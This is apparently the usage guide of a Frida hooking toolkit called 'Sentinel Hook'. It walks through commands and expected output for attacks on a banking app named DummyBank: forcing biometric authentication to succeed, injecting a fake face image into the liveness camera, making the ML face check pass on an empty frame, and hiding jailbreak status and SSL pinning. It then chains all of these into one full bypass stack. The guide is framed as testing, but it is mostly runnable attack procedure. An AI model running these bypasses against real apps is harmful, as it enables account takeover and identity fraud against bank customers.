<div align="center">

# 📖 USAGE — Test & Operations Guide

### Sentinel Hook · Module-by-Module Testing Manual

[![Frida](https://img.shields.io/badge/Frida-17.9.1-00C9FF?style=for-the-badge&logo=python&logoColor=white)](https://frida.re)
[![iOS](https://img.shields.io/badge/iOS-16%2B-black?style=for-the-badge&logo=apple)](https://developer.apple.com)
[![Android](https://img.shields.io/badge/Android-11%2B-3DDC84?style=for-the-badge&logo=android&logoColor=white)](https://developer.android.com)

</div>

---

## 📂 Module Map

```
src/hooks/
├── 01_biometrics/       ←  Phase 2: FaceID / BiometricPrompt breakers
├── 02_camera/           ←  Phase 3: Camera sensor spoofing
├── 03_ml_vision/        ←  Phase 4: AI / ML blindspot injection
└── 04_anti_tamper/      ←  Phase 5: Stealth layer
```

---

## 🔬 Setup: Connecting Your Device to Frida

Before running any tests, confirm Frida can see your device:

```bash
# Activate virtual environment
source .venv/bin/activate

# List all running apps on connected device
frida-ps -Uai
```

You should see `DummyBank` (or your target app name/bundle ID) in the output.

---

## 🔥 Module-by-Module Test Scenarios

### 📦 Section 1 — Biometric Bypass `01_biometrics/`

**Goal:** Receive an `"Authentication Successful"` response without any Face ID / Fingerprint match.

```bash
frida -U -n DummyBank -l src/hooks/01_biometrics/local_auth_bypass.js
```

**Expected Terminal Output:**
```
[🌟] SENTINEL: Biometric Bypass Active
[+] evaluatePolicy hooked → return TRUE forced
[💥] Authentication succeeded (Bypass)!
```

> [!TIP]
> After launching the script, tap **"Log In with Face ID"** on the device screen. The lock will open without any hardware scan.

---

### 📦 Section 2 — Camera Bypass `02_camera/`

**Goal:** Force a static fake image (`hacker.jpg`) into the liveness camera feed.

```bash
# Place your test face image first
cp /path/to/face.jpg .local/test-faces/hacker.jpg

# Inject the hook
frida -U -n DummyBank -l src/hooks/02_camera/camera_bypass.js
```

**Expected Terminal Output:**
```
[🌟] SENTINEL HOOK: Camera Bypass Active...
[💥] SENTINEL INTERCEPTED: Sensor frame received!
[Action]: FAKE FACE INJECTED → Sent to Liveness Engine!
```

---

### 📦 Section 3 — AI / ML Bypass `03_ml_vision/`

**Goal:** Receive a **"Live Human Face Confirmed"** approval even on a completely dark / empty frame.

```bash
frida -U -n DummyBank -l src/hooks/03_ml_vision/vision_bypass.js
```

**Expected Terminal Output:**
```
[+] TARGET AI ENGINE FOUND: VNDetectFaceRectanglesRequest
[💥] SENTINEL: AI deceived! 'Live Face' approval granted!
```

> [!NOTE]
> Place your phone face-down (completely dark camera) and tap the button. It will still approve.

---

### 📦 Section 4 — Anti-Tamper Bypass `04_anti_tamper/`

**Goal:** Prevent the app from crashing with **"Device is Jailbroken!"** and bypassing detection entirely.

```bash
# Use -f to let Frida spawn the app (hooks from first instruction)
frida -U -f com.dummy.bank -l src/hooks/04_anti_tamper/root_jailbreak_bypass.js
```

**Expected Terminal Output:**
```
[🌟] SENTINEL HOOK: Root & Jailbreak Bypass Active...
[+] Objective-C 'NSFileManager.fileExistsAtPath' hooked.
[💥] SENTINEL HIDING: App searched for blacklisted path (/Applications/Cydia.app)
```

---

## 🔗 ALL-IN-ONE: Firing the Full Bypass Stack

In a real test scenario, the target app checks jailbreak status, opens the camera, AND runs AI analysis simultaneously. Run everything at once:

```bash
frida -U -n DummyBank \
    -l src/hooks/04_anti_tamper/root_jailbreak_bypass.js \
    -l src/hooks/04_anti_tamper/ssl_pinning_bypass.js \
    -l src/hooks/02_camera/camera_bypass.js \
    -l src/hooks/03_ml_vision/vision_bypass.js \
    -l src/hooks/01_biometrics/local_auth_bypass.js
```

> [!IMPORTANT]
> Always place `04_anti_tamper` modules **first** in the chain. The stealth layer must activate before other hooks can be detected.
